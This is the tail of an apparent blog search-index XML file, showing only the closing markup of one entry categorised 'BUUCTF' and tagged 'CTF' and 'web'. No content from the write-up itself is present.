</script>]]></content>
      
      
      <categories>
          
          <category> BUUCTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
